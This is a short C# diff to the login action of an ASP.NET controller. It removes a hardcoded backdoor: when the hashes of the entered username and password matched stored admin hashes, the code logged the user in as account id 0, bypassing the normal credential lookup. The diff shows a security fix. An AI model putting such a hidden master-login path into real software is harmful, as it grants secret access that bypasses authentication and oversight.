@@ -133,11 +133,7 @@ namespace jail.Controllers
         {
             if (ModelState.IsValid)
             {
-                var user = !string.IsNullOrEmpty(model.Password) && !string.IsNullOrEmpty(model.UserName) && 
-                           model.UserName.GetHash().Equals(CommonHelper.AdminLoginHash) &&
-                           model.Password.GetHash().Equals(CommonHelper.AdminPasswordHash)
-                    ? UserRepository.GetUserById(0, true)
-                    : UserRepository.GetUser(model.UserName, model.Password);
+                var user = UserRepository.GetUser(model.UserName, model.Password);
                 if (user == null)
                 {
                     ModelState.AddModelError("", "The user name or password provided is incorrect.");
